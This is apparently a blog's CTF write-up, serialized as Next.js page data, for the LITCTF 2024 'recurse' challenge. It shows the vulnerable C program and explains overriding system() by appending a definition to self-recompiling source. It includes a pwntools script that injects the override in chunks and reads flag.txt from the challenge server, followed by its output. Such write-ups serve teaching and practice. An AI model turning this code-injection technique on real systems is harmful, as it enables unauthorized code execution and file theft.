1:"$Sreact.fragment"
2:I[39756,["/_next/static/chunks/ff1a16fafef87110.js","/_next/static/chunks/b71c1cfea9076b4b.js"],"default"]
3:I[37457,["/_next/static/chunks/ff1a16fafef87110.js","/_next/static/chunks/b71c1cfea9076b4b.js"],"default"]
4:I[22016,["/_next/static/chunks/b9afcb09c56609a6.js"],""]
6:I[97367,["/_next/static/chunks/ff1a16fafef87110.js","/_next/static/chunks/b71c1cfea9076b4b.js"],"OutletBoundary"]
7:"$Sreact.suspense"
9:I[97367,["/_next/static/chunks/ff1a16fafef87110.js","/_next/static/chunks/b71c1cfea9076b4b.js"],"ViewportBoundary"]
b:I[97367,["/_next/static/chunks/ff1a16fafef87110.js","/_next/static/chunks/b71c1cfea9076b4b.js"],"MetadataBoundary"]
d:I[68027,["/_next/static/chunks/ff1a16fafef87110.js","/_next/static/chunks/b71c1cfea9076b4b.js"],"default"]
:HL["/_next/static/chunks/3c1b2f4e7e90f1ff.css","style"]
:HL["/_next/static/media/83afe278b6a6bb3c-s.p.3a6ba036.woff2","font",{"crossOrigin":"","type":"font/woff2"}]
0:{"P":null,"b":"QiRS6Sx9Ttvp1BSl4xu2I","c":["","writeups","850fe47a2d02422cae230ff311db4b84"],"q":"","i":false,"f":[[["",{"children":["writeups",{"children":[["id","850fe47a2d02422cae230ff311db4b84","d"],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",true],[["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/chunks/3c1b2f4e7e90f1ff.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"className":"dark scroll-smooth","children":[["$","head",null,{"children":["$","meta",null,{"charSet":"utf-8"}]}],["$","body",null,{"className":"text-dark dark:text-white dark:bg-midnight","style":{"fontFamily":"'Inter', 'Inter Fallback'","fontStyle":"normal"},"children":["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[["$","div",null,{"className":"h-screen flex items-center justify-center","children":["$","main",null,{"className":"relative pl-14","children":[["$","svg",null,{"stroke":"currentColor","fill":"currentColor","strokeWidth":"0","viewBox":"0 0 512 512","className":"absolute left-0 top-2 text-5xl text-grapefruit","children":["$undefined",[["$","path","0",{"d":"M256 48C140.559 48 48 140.559 48 256c0 115.436 92.559 208 208 208 115.435 0 208-92.564 208-208 0-115.441-92.564-208-208-208zm104.002 282.881l-29.12 29.117L256 285.117l-74.881 74.881-29.121-29.117L226.881 256l-74.883-74.881 29.121-29.116L256 226.881l74.881-74.878 29.12 29.116L285.119 256l74.883 74.881z","children":[]}]]],"style":{"color":"$undefined"},"height":"1em","width":"1em","xmlns":"http://www.w3.org/2000/svg"}],["$","h1",null,{"className":"font-bold text-7xl underline decoration-grapefruit mb-5","children":"404."}],["$","p",null,{"children":"Your requested page was not found."}],["$","$L4",null,{"href":"/","className":"font-medium text-inherit","children":"Return to home →"}]]}]}],[]],"forbidden":"$undefined","unauthorized":"$undefined"}]}]]}]]}],{"children":[["$","$1","c",{"children":[null,["$","main",null,{"className":"container pt-20 pb-24","children":["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]}]]}],{"children":[["$","$1","c",{"children":[[["$","script","script-0",{"src":"/_next/static/chunks/b9afcb09c56609a6.js","async":true,"nonce":"$undefined"}]],[["$","$L4",null,{"href":"/writeups","className":"text-secondary text-sm mb-10 -ml-5 block w-max","children":"← Back to writeups"}],["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]]}],{"children":[["$","$1","c",{"children":["$L5",[["$","script","script-0",{"src":"/_next/static/chunks/59d5dd52dd9fcb16.js","async":true,"nonce":"$undefined"}],["$","script","script-1",{"src":"/_next/static/chunks/0eb309e820c00a6d.js","async":true,"nonce":"$undefined"}],["$","script","script-2",{"src":"/_next/static/chunks/239c8c4944a9f036.js","async":true,"nonce":"$undefined"}],["$","script","script-3",{"src":"/_next/static/chunks/39b99946d2be6a43.js","async":true,"nonce":"$undefined"}]],["$","$L6",null,{"children":["$","$7",null,{"name":"Next.MetadataOutlet","children":"$@8"}]}]]}],{},null,false,false]},null,false,false]},null,false,false]},null,false,false],["$","$1","h",{"children":[null,["$","$L9",null,{"children":"$@a"}],["$","div",null,{"hidden":true,"children":["$","$Lb",null,{"children":["$","$7",null,{"name":"Next.Metadata","children":"$@c"}]}]}],["$","meta",null,{"name":"next-size-adjust","content":""}]]}],false]],"m":"$undefined","G":["$d",[]],"s":false,"S":true}
a:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1"}]]
e:I[10453,["/_next/static/chunks/b9afcb09c56609a6.js","/_next/static/chunks/59d5dd52dd9fcb16.js","/_next/static/chunks/0eb309e820c00a6d.js","/_next/static/chunks/239c8c4944a9f036.js","/_next/static/chunks/39b99946d2be6a43.js"],"default"]
f:T6c9,#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

int get(char* buf, int n) {
    fflush(stdout);
    if (fgets(buf, n, stdin) == NULL) {
        puts("Error");
        exit(1);
    }
    int end = strcspn(buf, "\n");
    if (buf[end] == '\0') {
        puts("Too long");
        exit(1);
    }
    buf[end] = '\0';
    return end;
}

int main(void) {
    fputs("Filename? ", stdout);
    char fname[10];
    int fn = get(fname, sizeof(fname));
    for (int i = 0; i < fn; ++i) {
        char c = fname[i];
        if (('a' <= c && c <= 'z') || c == '.') {
            continue;
        }
        puts("Only a-z and .");
        return 1;
    }
    if (strstr(fname, "flag.txt") != NULL) {
        printf("Nice try!");
        return 1;
    }
    FILE* file = fopen(fname, "a+b");

    fputs("Read (R) or Write (W)? ", stdout);
    char option[3];
    get(option, sizeof(option));

    switch (option[0]) {
        case 'R': {
            char contents[25];
            int n = fread(contents, 1, sizeof(contents), file);
            fputs("Contents: ", stdout);
            fwrite(contents, 1, n, stdout);
            puts("");
            break;
        }
        case 'W': {
            fputs("Contents? ", stdout);
            char contents[25];
            int n = get(contents, sizeof(contents));
            fwrite(contents, 1, n, file);
            break;
        }
        default: {
            puts("Invalid");
            return 1;
        }
    }

    fclose(file);
    fflush(stdout);

    int ret = system("gcc main.c -o main");
    if (!WIFEXITED(ret) || WEXITSTATUS(ret)) {
        puts("Compilation failed");
        return 1;
    }
    execl("main", "main", NULL);
}5:["$","div",null,{"children":["$","main",null,{"className":"text-pretty max-w-5xl mx-auto text-sm [&_h1]:text-5xl [&_h1]:font-semibold [&_h1]:mb-8 [&_blockquote]:text-secondary [&_blockquote]:space-y-3 [&_blockquote]:border-l-4 [&_blockquote]:border-secondary [&_blockquote]:pl-5 [&_blockquote]:mb-5 [&>_p]:my-4 [&_img]:my-5 [&_ul]:list-disc [&_ul]:pl-6 [&_ol]:list-decimal [&_ol]:pl-6 [&_img]:rounded [&_li]:my-2","children":[["$","h1","h1-0",{"children":"LITCTF 2024 — recurse"}],"\n",["$","blockquote","blockquote-0",{"children":["\n",["$","p","p-0",{"children":"I hate loops."}],"\n"]}],"\n",["$","p","p-0",{"children":"We're given a C file that looks like this:"}],"\n",["$","$Le","pre-0",{"className":"my-2","children":"$f","language":"c"}],"\n",["$","p","p-1",{"children":"At every iteration, we can either"}],"\n",["$","ul","ul-0",{"children":["\n",["$","li","li-0",{"children":"read the first 25 characters of a file."}],"\n",["$","li","li-1",{"children":"append 25 characters to the end of a file."}],"\n"]}],"\n",["$","p","p-2",{"children":["where the file can't be ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"flag.txt"}],". Then, the program recompiles and re-runs itself if no compilation errors occurred."]}],"\n",["$","p","p-3",{"children":["The main idea of this challenge is that we can append arbitrary code to ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"main.c"}],", which will hopefully get executed when the file is recompiled and run. The problem, however, is that because we can only ",["$","em","em-0",{"children":"append"}]," to files, we can only write code after the ",["$","code","code-1",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"main()"}]," function is already defined; since ","$L10","s only replace tokens parsed ","$L11"," the directive, they won't help here either. What can we write that will get executed if we can only write to the end of the file?"]}],"\n","$L12","\n","$L13","\n","$L14","\n","$L15","\n","$L16","\n","$L17","\n","$L18","\n","$L19","\n","$L1a","\n","$L1b","\n","$L1c"]}]}]
10:["$","code","code-2",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"#define"}]
11:["$","em","em-1",{"children":"after"}]
12:["$","p","p-4",{"children":"Interestingly, redefining certain C stdlib functions causes the updated function definition to be used even if the redefinition happened after the usage. For example, the following C program prints \"aaa\" as expected:"}]
13:["$","$Le","pre-1",{"className":"my-2","children":"#include <string.h>\n#include <stdio.h>\n\nint main() {\n    printf(\"%s\", strstr(\"aaa\", \"a\"));\n}\n\nchar *strstr(const char *s, const char *t) {\n    return \"hello\";\n}","language":"c"}]
14:["$","$Le","pre-2",{"className":"my-2","children":"kevin@ky28059:~$ gcc test_a.c\nkevin@ky28059:~$ ./a.out\naaa","language":"bash"}]
15:["$","p","p-5",{"children":["However, the following program prints \"hello\" unexpectedly, even though the ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"strdup"}]," redefinition happens after ",["$","code","code-1",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"main"}]," is defined:"]}]
16:["$","$Le","pre-3",{"className":"my-2","children":"#include <string.h>\n#include <stdio.h>\n\nint main() {\n    printf(\"%s\", strdup(\"aaa\"));\n}\n\nchar *strdup(const char *s) {\n    return \"hello\";\n}","language":"c"}]
17:["$","$Le","pre-4",{"className":"my-2","children":"kevin@ky28059:~$ gcc test_b.c\nkevin@ky28059:~$ ./a.out\nhello","language":"bash"}]
18:["$","p","p-6",{"children":["Knowing this, we can look for functions in the remote C program that might be vulnerable to such a redefinition. Though ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"fputs"}]," and ",["$","code","code-1",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"strstr"}]," are safe, ",["$","code","code-2",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"system"}]," is not."]}]
19:["$","p","p-7",{"children":["Then, we just need to write a script that would inject a malicious redefinition of ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"system"}]," such that a call to ",["$","code","code-1",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"system"}]," will cat the flag. Because we can only write 24 characters at a time (and need ",["$","code","code-2",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"main.c"}]," to compile each time), we can write our payload in chunks to a header file instead."]}]
1a:["$","p","p-8",{"children":["Then, we can ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"#include"}]," the header file and run through the program again to trigger ",["$","code","code-1",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"system"}]," and get the flag. Here's a Python script that does just that:"]}]
1b:["$","$Le","pre-5",{"className":"my-2","children":"import pwn\n\npayload = 'int system(const char *s) {FILE *fp = fopen(\"flag.txt\", \"r\");char buf[256];fscanf(fp, \"%s\", buf);printf(\"%s\\\\n\", buf);fflush(stdout);return 0;}'\n\n\nconn = pwn.remote('34.31.154.223', 56284)\n\n# Populate `p.h` with our malicious payload\nfor i in range(0, len(payload), 20):\n    conn.recvuntil(b'Filename? ')\n    conn.sendline(b'p.h')\n\n    conn.recvuntil(b'Read (R) or Write (W)? ')\n    conn.sendline(b'W')\n\n    conn.recvuntil(b'Contents? ')\n    conn.sendline(payload[i:i+20].encode())\n\n    print(payload[i:i+20], end='')\n\nprint()\n\n# Include the payload header file in the main C file\nconn.recvuntil(b'Filename? ')\nconn.sendline(b'main.c')\n\nconn.recvuntil(b'Read (R) or Write (W)? ')\nconn.sendline(b'W')\n\nconn.recvuntil(b'Contents? ')\nconn.sendline(b'#include \"p.h\"')\n\n# One more run to invoke the redefined `system()` call\nconn.recvuntil(b'Filename? ')\nconn.sendline(b'p.h')\n\nconn.recvuntil(b'Read (R) or Write (W)? ')\nconn.sendline(b'R')\n\nprint(conn.recvline().decode())\nprint(conn.recvline().decode())","language":"py"}]
1c:["$","$Le","pre-6",{"className":"my-2","children":"[x] Opening connection to 34.31.154.223 on port 56284\n[x] Opening connection to 34.31.154.223 on port 56284: Trying 34.31.154.223\n[+] Opening connection to 34.31.154.223 on port 56284: Done\nint system(const char *s) {FILE *fp = fopen(\"flag.txt\", \"r\");char buf[256];fscanf(fp, \"%s\", buf);printf(\"%s\\n\", buf);fflush(stdout);return 0;}\nContents: int system(const char *s)\n\nLITCTF{4_pr0gr4m_7h4t_m0d1f13s_1t5elf?_b34u71ful!_a1cd446b}\n\n[*] Closed connection to 34.31.154.223 port 56284","language":"$undefined"}]
c:[["$","title","0",{"children":"LITCTF 2024 — recurse | kevin.fish"}],["$","meta","1",{"name":"description","content":"I hate loops."}],["$","meta","2",{"property":"og:title","content":"LITCTF 2024 — recurse"}],["$","meta","3",{"property":"og:description","content":"I hate loops."}],["$","meta","4",{"name":"twitter:card","content":"summary"}],["$","meta","5",{"name":"twitter:title","content":"LITCTF 2024 — recurse"}],["$","meta","6",{"name":"twitter:description","content":"I hate loops."}]]
8:null
